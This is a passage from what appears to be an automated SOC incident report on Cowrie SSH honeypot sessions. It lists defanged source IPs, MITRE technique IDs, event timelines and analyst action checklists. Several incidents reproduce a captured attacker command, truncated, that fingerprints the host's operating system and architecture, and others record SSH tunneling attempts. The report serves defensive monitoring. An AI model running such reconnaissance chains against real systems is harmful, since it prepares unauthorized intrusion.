| `2026-07-30 01:58:34` | `cowrie.command.success` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:35` | `cowrie.log.closed` |
| `2026-07-30 01:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7627ab630391

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:59 |
| **Last Seen** | 2026-07-30 01:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:59:55` | `cowrie.session.connect` |
| `2026-07-30 01:59:56` | `cowrie.client.version` |
| `2026-07-30 01:59:56` | `cowrie.client.kex` |
| `2026-07-30 01:59:57` | `cowrie.login.success` |
| `2026-07-30 01:59:58` | `cowrie.session.params` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.success` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:58` | `cowrie.command.input` |
| `2026-07-30 01:59:59` | `cowrie.log.closed` |
| `2026-07-30 01:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-decb10695754

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:01 |
| **Last Seen** | 2026-07-30 02:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:01:23` | `cowrie.session.connect` |
| `2026-07-30 02:01:23` | `cowrie.client.version` |
| `2026-07-30 02:01:23` | `cowrie.client.kex` |
| `2026-07-30 02:01:24` | `cowrie.login.success` |
| `2026-07-30 02:01:25` | `cowrie.session.params` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.success` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:25` | `cowrie.command.input` |
| `2026-07-30 02:01:26` | `cowrie.log.closed` |
| `2026-07-30 02:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d67eeea1728

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:02 |
| **Last Seen** | 2026-07-30 02:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:02:50` | `cowrie.session.connect` |
| `2026-07-30 02:02:50` | `cowrie.client.version` |
| `2026-07-30 02:02:50` | `cowrie.client.kex` |
| `2026-07-30 02:02:51` | `cowrie.login.success` |
| `2026-07-30 02:02:53` | `cowrie.session.params` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.success` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.command.input` |
| `2026-07-30 02:02:53` | `cowrie.log.closed` |
| `2026-07-30 02:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5493e19aede2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:04 |
| **Last Seen** | 2026-07-30 02:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:04:19` | `cowrie.session.connect` |
| `2026-07-30 02:04:20` | `cowrie.client.version` |
| `2026-07-30 02:04:20` | `cowrie.client.kex` |
| `2026-07-30 02:04:21` | `cowrie.login.success` |
| `2026-07-30 02:04:22` | `cowrie.session.params` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.success` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.command.input` |
| `2026-07-30 02:04:22` | `cowrie.log.closed` |
| `2026-07-30 02:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-571aa0a7c56e

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-07-30 02:05 |
| **Last Seen** | 2026-07-30 02:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:05:26` | `cowrie.session.connect` |
| `2026-07-30 02:05:27` | `cowrie.client.version` |
| `2026-07-30 02:05:27` | `cowrie.client.kex` |
| `2026-07-30 02:05:28` | `cowrie.login.success` |
| `2026-07-30 02:05:28` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad44ecd3deaa

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-07-30 02:05 |
| **Last Seen** | 2026-07-30 02:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:05:38` | `cowrie.session.connect` |
| `2026-07-30 02:05:39` | `cowrie.client.version` |
| `2026-07-30 02:05:39` | `cowrie.client.kex` |
| `2026-07-30 02:05:40` | `cowrie.login.success` |
| `2026-07-30 02:05:41` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de718c042b70

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-07-30 02:05 |
| **Last Seen** | 2026-07-30 02:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:05:44` | `cowrie.session.connect` |
| `2026-07-30 02:05:45` | `cowrie.client.version` |
| `2026-07-30 02:05:45` | `cowrie.client.kex` |
| `2026-07-30 02:05:45` | `cowrie.login.success` |
| `2026-07-30 02:05:46` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea1153f06eb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:05 |
| **Last Seen** | 2026-07-30 02:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:05:46` | `cowrie.session.connect` |
| `2026-07-30 02:05:47` | `cowrie.client.version` |
| `2026-07-30 02:05:47` | `cowrie.client.kex` |
| `2026-07-30 02:05:48` | `cowrie.login.success` |
| `2026-07-30 02:05:49` | `cowrie.session.params` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.success` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.command.input` |
| `2026-07-30 02:05:49` | `cowrie.log.closed` |
| `2026-07-30 02:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936580fbecaf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:07 |
| **Last Seen** | 2026-07-30 02:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:07:18` | `cowrie.session.connect` |
| `2026-07-30 02:07:18` | `cowrie.client.version` |
| `2026-07-30 02:07:18` | `cowrie.client.kex` |
| `2026-07-30 02:07:19` | `cowrie.login.success` |
| `2026-07-30 02:07:20` | `cowrie.session.params` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.success` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:20` | `cowrie.command.input` |
| `2026-07-30 02:07:21` | `cowrie.log.closed` |
| `2026-07-30 02:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89338c8b5639

| Field | Detail |
|---|---|
| **Source IP** | `90.228.229[.]182` |
| **First Seen** | 2026-07-30 02:08 |
| **Last Seen** | 2026-07-30 02:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:08:02` | `cowrie.session.connect` |
| `2026-07-30 02:08:03` | `cowrie.client.version` |
| `2026-07-30 02:08:03` | `cowrie.client.kex` |
| `2026-07-30 02:08:04` | `cowrie.login.success` |
| `2026-07-30 02:08:04` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.228.229[.]182` to AbuseIPDB if not already reported
- [ ] Block `90.228.229[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1410ea5947d

| Field | Detail |
|---|---|
| **Source IP** | `220.246.46[.]144` |
| **First Seen** | 2026-07-30 02:08 |
| **Last Seen** | 2026-07-30 02:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:08:09` | `cowrie.session.connect` |
| `2026-07-30 02:08:10` | `cowrie.client.version` |
| `2026-07-30 02:08:10` | `cowrie.client.kex` |
| `2026-07-30 02:08:12` | `cowrie.login.success` |
| `2026-07-30 02:08:13` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.46[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.246.46[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9556bb5c6efb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:08 |
| **Last Seen** | 2026-07-30 02:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:08:59` | `cowrie.session.connect` |
| `2026-07-30 02:09:00` | `cowrie.client.version` |
| `2026-07-30 02:09:00` | `cowrie.client.kex` |
| `2026-07-30 02:09:01` | `cowrie.login.success` |
| `2026-07-30 02:09:02` | `cowrie.session.params` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.success` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.command.input` |
| `2026-07-30 02:09:02` | `cowrie.log.closed` |
| `2026-07-30 02:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85072621babe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:10 |
| **Last Seen** | 2026-07-30 02:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:10:32` | `cowrie.session.connect` |
| `2026-07-30 02:10:32` | `cowrie.client.version` |
| `2026-07-30 02:10:32` | `cowrie.client.kex` |
| `2026-07-30 02:10:34` | `cowrie.login.success` |
| `2026-07-30 02:10:36` | `cowrie.session.params` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.success` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.command.input` |
| `2026-07-30 02:10:36` | `cowrie.log.closed` |
| `2026-07-30 02:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80281ef06d74

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:11 |
| **Last Seen** | 2026-07-30 02:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:11:59` | `cowrie.session.connect` |
| `2026-07-30 02:11:59` | `cowrie.client.version` |
| `2026-07-30 02:11:59` | `cowrie.client.kex` |
| `2026-07-30 02:12:01` | `cowrie.login.success` |
| `2026-07-30 02:12:02` | `cowrie.session.params` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.success` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:02` | `cowrie.command.input` |
| `2026-07-30 02:12:03` | `cowrie.log.closed` |
| `2026-07-30 02:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0cd1ff99ae8

| Field | Detail |
|---|---|
| **Source IP** | `221.10.221[.]104` |
| **First Seen** | 2026-07-30 02:13 |
| **Last Seen** | 2026-07-30 02:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:13:16` | `cowrie.session.connect` |
| `2026-07-30 02:13:17` | `cowrie.client.version` |
| `2026-07-30 02:13:17` | `cowrie.client.kex` |
| `2026-07-30 02:13:19` | `cowrie.login.success` |
| `2026-07-30 02:13:20` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.10.221[.]104` to AbuseIPDB if not already reported
- [ ] Block `221.10.221[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

